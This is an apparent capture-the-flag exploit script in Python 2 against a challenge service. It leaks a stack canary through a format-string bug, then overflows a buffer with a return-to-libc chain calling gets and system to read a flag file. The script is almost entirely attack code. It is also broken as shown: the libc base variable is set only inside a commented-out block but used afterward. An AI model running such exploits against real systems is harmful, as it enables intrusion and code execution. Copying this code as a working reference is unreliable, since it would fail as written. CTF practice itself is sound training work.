import socket, time, struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('127.0.0.1', 4444))
s.connect(('csie.ctf.tw', 6031))

def W(x):
  s.send(x)
  time.sleep(0.1)

def R():
  return s.recv(4096)

def PI(x):
  return struct.pack('I', x)

main_text = 0x080485d2
printf_plt = 0x080483c0
printf_got = 0x0804a00c
printf_offset = 0x0004cbb0
fflush_plt = 0x080483d0
fflush_got = 0x0804a010
fflush_offset = 0x00063660

# let the value in got be filled in
W("XDDn")
R()

""" check the value in main to see if format string works
W(PI(printf_got) + '%4$s' + 'n')
aslr = struct.unpack('I', R()[4:8])[0] - printf_offset
print 'value in main = ' + hex(aslr)
"""

W('%19$xn')
canary = PI(int(R(),16))
print 'Canary = ' + canary.encode('hex')

"""
write_libc = 0x000d9da0 + aslr
print hex(write_libc)

W('A'*60 + canary + 'A'*12 + 
  PI(write_libc) + PI(main_text) + PI(1) + PI(main_text) + PI(20) + 'n')
print "XD" + R()
"""

gets_offset = 0x00064ae0
system_offset = 0x0003fc40

gets_libc = gets_offset + aslr
system_libc = system_offset + aslr
print hex(gets_libc), hex(system_libc)
free_buf = printf_got

W('A'*60 + canary + 'A'*12 + PI(gets_libc) + PI(system_libc) + PI(free_buf) + PI(free_buf) + 'n')
time.sleep(0.5)
W('cat /home/fmtrop/flag \n')
print R()

exit()
